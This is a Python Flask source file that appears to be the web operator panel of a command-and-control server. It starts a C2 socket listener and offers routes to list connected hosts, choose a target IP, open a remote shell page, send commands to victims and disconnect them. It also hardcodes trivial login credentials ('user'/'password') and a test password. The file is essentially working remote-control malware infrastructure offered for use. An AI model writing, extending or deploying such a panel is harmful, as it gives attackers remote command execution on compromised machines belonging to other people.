from flask import *
import os, time
from Socket.Server import Server


class FlskSevrev(object):
    
    def __init__(self,C2Private,C2Port=555):
        self.app = Flask(
            __name__, 
            static_folder=os.path.join(os.getcwd(),'FlascAplication','test','templates','static')
        )
        self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
        self.c2Server.start()
        self._ruleResetor()
        self.test = {'Aharon': 'Qwerty123'}
        self.numberOftry = {}
        

    def loginPage(self):
        return render_template("Login.html")

    def login(self):
        if request.method == 'POST':
            data = request.get_json()
            username = data['username']
            password = data['password']
            if username == 'user' and password == 'password':
                return jsonify({"message": "Login successful"})
            else:
                return jsonify({"message": "Invalid username or password"}), 401
        return self.loginPage()


    def getshell(self,hostname):
        if self.c2Server.connections.isconnected(hostname):
            return render_template('ChatBox.html',hostname=hostname)
        return make_response("Page not found", 404)
    
    def choseTarget(self):
        data = request.get_json()
        self.c2Server.connections.connctTo = data['ip']
        return {'Status': 'Completed'}


    def listConnections(self):
        return self.c2Server.connections.connections
    
    
    def homePage(self):
        return render_template('Index.html')
    

    def send_message(self):
        data = request.get_json()
        connObj = self.c2Server.connections.getConnObj(data['ip'])
        msg = self.c2Server.retriveCommand(connObj,data['message'])
        return {'message': msg}
    
    
    def closeShell(self):
        data = request.get_json()
        connObj = self.c2Server.connections.getConnObj(data['ip'])
        self.c2Server.sendMsg(connObj,b'exit')
        self.c2Server.connections.disconnect(data['ip'])
        return {'Status':"Disconnect"}

    
    def _ruleResetor(self):
        self.app.add_url_rule('/','loginPage',self.loginPage)
        self.app.add_url_rule('/login','login', self.login ,methods=['GET', 'POST'])
        self.app.add_url_rule('/home', 'homePage', self.homePage)
        self.app.add_url_rule('/listConnections', 'listConnections', self.listConnections)
        self.app.add_url_rule('/getshell/<hostname>', 'getshell', self.getshell)
        self.app.add_url_rule('/send_message', 'send_message', self.send_message, methods=['POST'])
        self.app.add_url_rule('/closeShell', 'closeShell', self.closeShell, methods=['POST'])
        self.app.add_url_rule('/choseTarget', 'choseTarget', self.choseTarget, methods=['POST'])

